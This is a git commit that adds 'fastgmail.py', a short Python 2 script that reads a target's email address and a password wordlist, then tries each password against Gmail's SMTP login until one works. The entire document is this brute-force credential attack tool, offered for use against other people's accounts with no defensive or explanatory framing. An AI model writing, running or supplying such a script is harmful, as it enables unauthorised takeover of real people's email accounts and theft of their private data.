275d2ac41239219bfaf65781e21a2a33114b8f93
BLACK-KILLER <63947251+ShuBhamg0sain@users.noreply.github.com>
2021-01-24 20:01:11 +0530

    Create fastgmail.py

---
+++ fastgmail.py
@@ -0,0 +1,18 @@
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = raw_input("Enter the target's email address: ")
+passwfile = raw_input("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+	try:
+		smtpserver.login(user, password)
+
+		print "[+] Password Found: %s" % password
+		break;
+	except smtplib.SMTPAuthenticationError:
+		print "[!] Password Incorrect: %s" % password
